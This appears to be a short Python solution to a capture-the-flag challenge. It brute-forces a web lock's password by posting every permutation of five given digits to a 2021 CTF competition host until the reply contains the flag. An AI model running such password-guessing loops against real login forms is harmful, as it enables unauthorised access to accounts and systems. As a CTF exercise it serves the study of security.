import itertools
import requests

for p in list(itertools.permutations([3,5,7,8,0])):
    pwd = "".join(map(str, list(p)))
    print(f"Testing passwd: {pwd}")
    r = requests.post("https://old-lock-web.2021.ctfcompetition.com/", data={'v': pwd})
    if ("CTF" in r.text) :
        print(r.text)
        print(f"Passwd found! {pwd}")
        break




